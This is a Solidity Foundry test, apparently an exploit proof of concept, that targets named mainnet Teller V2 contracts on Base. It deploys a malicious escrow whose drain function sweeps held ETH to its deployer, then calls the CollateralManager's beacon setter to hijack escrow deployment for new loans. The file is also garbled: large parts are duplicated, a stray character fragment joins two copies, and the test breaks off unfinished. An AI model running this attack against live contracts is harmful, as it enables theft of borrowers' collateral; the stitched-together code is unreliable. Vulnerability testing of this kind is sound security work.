// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface ICollateralManager {
    function setCollateralEscrowBeacon(address _beacon) external;
    function getEscrow(uint256 _bidId) external view returns (address);
    function isBidCollateralBacked(uint256 _bidId) external returns (bool);
}

interface ITellerV2 {
    function bidId() external view returns (uint256);
    function getLoanBorrower(uint256 _bidId) external view returns (address);
    function getBidState(uint256 _bidId) external view returns (uint8);
}

/// @dev Malicious escrow that simply accepts deposits and exposes a drain function.
///      It does not need to implement the full ICollateralEscrowV1 interface for
///      this test; the only thing that matters is that CollateralManager stores
///      its address as the beacon and deploys it for new bids.
contract MaliciousEscrow {
    address public owner;
    uint256 public bidId;

    constructor() {
        owner = msg.sender;
    }

    function initialize(uint256 _bidId) external {
        bidId = _bidId;
    }

    /// @notice Anyone can call this to sweep any ETH held by the proxy.
    function drain() external {
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "drain failed");
    }
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface ICollateralManager {
    function setCollateralEscrowBeacon(address _beacon) external;
    function getEscrow(uint256 _bidId) external view returns (address);
    function isBidCollateralBacked(uint256 _bidId) external returns (bool);
}

interface ITellerV2 {
    function bidId() external view returns (uint256);
    function getLoanBorrower(uint256 _bidId) external view returns (address);
    function getBidState(uint256 _bidId) external view returns (uint8);
}

/// @dev Malicious escrow that simply accepts deposits and exposes a drain function.
///      It does not need to implement the full ICollateralEscrowV1 interface for
///      this test; the only thing that matters is that CollateralManager stores
///      its address as the beacon and deploys it for new bids.
contract MaliciousEscrow {
    address public owner;
    uint256 public bidId;

    constructor() {
        owner = msg.sender;
    }

    function initialize(uint256 _bidId) external {
        bidId = _bidId;
    }

    /// @notice Anyone can call this to sweep any ETH held by the proxy.
    function drain() external {
        (bool ok, ) = owner.call{value: address(this).balance}("");
        require(ok, "drain failed");
    }

    receive() external payable {}
}

contract BeaconHijackTest is Test {
    // Base mainnet addresses (verified from docs.teller.org)
    address constant TELLER_V2     = 0x5cfD3aeD08a444Be32839bD911Ebecd688861164;
    address constant COLLATERAL_MGR = 0xD9149bfBfB29cC175041937eF8161600b464051B;
    address constant ORIGINAL_BEACON = 0x71B04a8569914bCb99D5F95644CF6b089c826024;

    ICollateralManager cm;
    ITellerV2 teller;

    function setUp() public {
        cm = ICollateralManager(COLLATERAL_MGR);
        teller = ITellerV2(TELLER_V2);
    }

    function test_SetCollateralEscrowBeacon_NoAccessControl() public {
        // 1. Confirm the current beacon is the legitimate one.
        //    (We cannot read the private `collateralEscrowBeacon` variable directly,
        //     but we can infer it by the fact that a new bid deploys an escrow.)
        //    For this test we simply call the vulnerable function with a malicious beacon.

        MaliciousEscrow maliciousImpl = new MaliciousEscrow();

        // 2. Deploy an UpgradeableBeacon that points to the malicious implementation.
        //    CollateralManager expects a beacon, not the implementation directly.
        //    We use OpenZeppelin's UpgradeableBeacon.
        address maliciousBeacon = address(new UpgradeableBeacon(address(maliciousImpl), address(this)));

        console.log("Original beacon (from docs):", ORIGINAL_BEACON);
        console.log("Malicious beacon deployed at:", maliciousBeacon);

        // 3. Call the unprotected setCollateralEscrowBeacon.
        //    If the protocol refuses, this call reverts.
        //    If the protocol is vulnerable, this succeeds.
        vm.expectCall(COLLATERAL_MGR, abi.encodeWithSelector(ICollateralManager.setCollateralEscrowBeacon.selector, maliciousBeacon));
        cm.setCollateralEscrowBeacon(maliciousBeacon);

        console.log("setCollateralEscrowBeacon succeeded. Protocol did NOT refuse the malicious beacon.");

        // 4. (Optional) Verify that the beacon was actually changed by checking
        //    that the CollateralManager no longer points to the original beacon.
        //    Since the variable is private, we rely on the successful call above
        //    and the absence of a revert as proof that the protocol is vulnerable.

        // 5. The test passes if setCollateralEscrowBeacon did not revert.
        //    A revert would indicate the protocol added access control and refused
        //    the malicious escrow contract.
    }
}

// Minimal OpenZeppelin UpgradeableBeacon interface for deployment.
// (Foundry will use the installed OpenZeppelin contracts if available;
//  otherwise you can add the package with `forge install openzeppelin/openzeppelin-contracts`.)
interface IUpgradeableBeacon {
    function upgradeTo(address newImplementation) external;
    function implementation() external view returns (address);
}

contract UpgradeableBeacon is IUpgradeableBeacon {
    address private _implementation;
    address private _owner;

    constructor(address implementation_, address owner_) {
        _implementation = implementation_;
        _owner = owner_;
    }

    function implementation() external view returns (address) {
        return _implementation;
    }

    function upgradeTo(address newImplementation) external {
        require(msg.sender == _owner, "not owner");
        _implementation = newImplementation;
    }
}￼Entereceive() external payable {}
}

contract BeaconHijackTest is Test {
    // Base mainnet addresses (verified from docs.teller.org)
    address constant TELLER_V2     = 0x5cfD3aeD08a444Be32839bD911Ebecd688861164;
    address constant COLLATERAL_MGR = 0xD9149bfBfB29cC175041937eF8161600b464051B;
    address constant ORIGINAL_BEACON = 0x71B04a8569914bCb99D5F95644CF6b089c826024;

    ICollateralManager cm;
    ITellerV2 teller;

    function setUp() public {
        cm = ICollateralManager(COLLATERAL_MGR);
        teller = ITellerV2(TELLER_V2);
    }

    function test_SetCollateralEscrowBeacon_NoAccessControl() public {
        // 1. Confirm the current beacon is the legitimate one.
        //    (We cannot read the private `collateralEscrowBeacon` variable directly,
        //     but we can infer it by the fact that a new bid deploys an escrow.)
        //    For this test we simply call the vulnerable function with a malicious beacon.

        MaliciousEscrow maliciousImpl = new MaliciousEscrow();

        // 2. Deploy an UpgradeableBeacon that points to the malicious implementation.
        //    CollateralManager expects a beacon, not the implementation directly.
        //    We use OpenZeppelin's UpgradeableBeacon.
        address maliciousBeacon = address(new UpgradeableBeacon(address(maliciousImpl), address(this)));

        console.log("Original beacon (from docs):", ORIGINAL_BEACON);
        console.log("Malicious beacon deployed at:", maliciousBeacon);

        // 3. Call the unprotected setCollateralEscrowBeacon.
        //    If the protocol refuses, this call reverts.
        //    If the protocol is vulnerable, this succeeds.
        vm.expectCall(COLLATERAL_MGR, abi.encodeWithSelector(ICollateralManager.setCollateralEscrowBeacon.selector, maliciousBeacon));
        cm.setCollateralEscrowBeacon(maliciousBeacon);
